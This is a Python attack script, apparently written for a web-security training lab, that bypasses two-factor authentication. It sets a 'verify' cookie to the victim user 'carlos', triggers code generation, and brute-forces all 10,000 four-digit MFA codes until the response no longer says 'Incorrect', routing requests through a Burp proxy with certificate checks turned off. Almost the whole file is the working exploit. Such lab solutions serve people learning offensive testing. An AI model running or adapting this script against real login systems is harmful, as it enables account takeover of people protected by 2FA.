import sys
import requests
import urllib3

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
# Going through Burp will allow sending to browser after bypassing 2FA
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

# Given info so no enumearation
# Need to login as known, send login2 URL as carlos using session cookie from known, then brute force carlos' token
def bypass_2FA(url, session_cookie):
    # Login with good creds - doing this manually for now
    #data = {
    #    "username":"wiener",
    #    "password":"peter"
    #}
    #s.post(url, data = data, verify=False, proxies=proxies)
    # Need to swap carlos into cookie - figure out later?
    
    print('Generating carlos 2FA code')
    #Send login w/carlos cookie
    ccookies = {
        "verify":"carlos",
        "session":f"{session_cookie}"
    }
    print(ccookies)

    gen_code = requests.get(url,cookies=ccookies, proxies=proxies, verify=False)
    print(gen_code.status_code)
    
    # Brute force the 2FA code
    print('Trying bypass')
    code = 0
    for code in range(0,10000):
        data = {
            "mfa-code":f"{code:04d}"
        }
        r = requests.post(url, data=data, cookies=ccookies, proxies=proxies, verify=False)
        # Could also use 302 as status code
        if 'Incorrect' not in r.text:
            print("2FA bypass successful")
            print(f"2FA code {code:04d}")
            break

if __name__ == "__main__":
    try:
        #valid_usernames = []
        url = sys.argv[1].strip()
        session_cookie = sys.argv[2].strip()

    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url-login> <url-login2>')
        print(f'[-] Example: {sys.argv[0]} www.example.com/login2 sessionCookie')
        sys.exit(-1)
    
    # Set up session to track gookies
    s = requests.Session()
    print('[-] Performing initial login and 2FA bypass')
    bypass_2FA(url, session_cookie)

